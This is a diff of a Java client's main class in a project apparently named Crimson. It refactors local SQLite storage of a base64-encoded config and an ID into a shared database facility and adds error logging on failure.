@@ -19,6 +19,8 @@ package com.subterranean_security.crimson.client;
 
 import java.awt.HeadlessException;
 import java.io.File;
+import java.io.IOException;
+import java.sql.SQLException;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -28,15 +30,16 @@ import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
 import com.subterranean_security.crimson.core.misc.EH;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
-import com.subterranean_security.crimson.core.storage.ClientDB;
+import com.subterranean_security.crimson.core.storage.BasicDatabase;
+import com.subterranean_security.crimson.core.storage.StorageFacility;
 import com.subterranean_security.crimson.core.util.B64Util;
 import com.subterranean_security.crimson.core.util.LogUtil;
 import com.subterranean_security.crimson.core.util.Native;
+import com.subterranean_security.crimson.universal.stores.Database;
 
 public class Client {
 	private static final Logger log = LoggerFactory.getLogger(Client.class);
 
-	public static ClientDB clientDB;
 	public static ClientConfig ic;
 
 	public static void main(String[] args) {
@@ -54,16 +57,17 @@ public class Client {
 		// Load native libraries
 		Native.Loader.load();
 
+		// Initialize database
+		initializeDatabase();
 		try {
-			clientDB = new ClientDB(new File(Common.Directories.base + "/var/client.db"));
-			ic = ClientConfig.parseFrom(B64Util.decode(clientDB.getString("ic")));
+			ic = ClientConfig.parseFrom(B64Util.decode(Database.getFacility().getString("ic")));
 		} catch (Exception e) {
-			// TODO: handle exception
-			System.out.println("Database error");
+			log.error("Internal configuration not found");
+			System.exit(0);
 		}
 
 		try {
-			Common.cvid = Client.clientDB.getInteger("cvid");
+			Common.cvid = Database.getFacility().getInteger("cvid");
 		} catch (Exception e2) {
 		}
 
@@ -84,13 +88,32 @@ public class Client {
 
 	}
 
+	private static void initializeDatabase() {
+		StorageFacility sf = new BasicDatabase(Client.class.getName(),
+				new File(Common.Directories.base + "/var/client.db"));
+		try {
+			sf.initialize();
+		} catch (ClassNotFoundException e) {
+			log.error("Failed to load SQLite dependancy");
+			System.exit(0);
+		} catch (IOException e) {
+			log.error("Failed to write database");
+			System.exit(0);
+		} catch (SQLException e) {
+			log.error("SQL error: {}", e.getMessage());
+			System.exit(0);
+		}
+
+		Database.setFacility(sf);
+	}
+
 	public static void saveIC() {
-		clientDB.storeObject("ic", new String(B64Util.encode(ic.toByteArray())));
+		Database.getFacility().store("ic", new String(B64Util.encode(ic.toByteArray())));
 	}
 
 	public static AuthenticationGroup getGroup() {
 		try {
-			return (AuthenticationGroup) clientDB.getObject("auth.group");
+			return (AuthenticationGroup) Database.getFacility().getObject("auth.group");
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
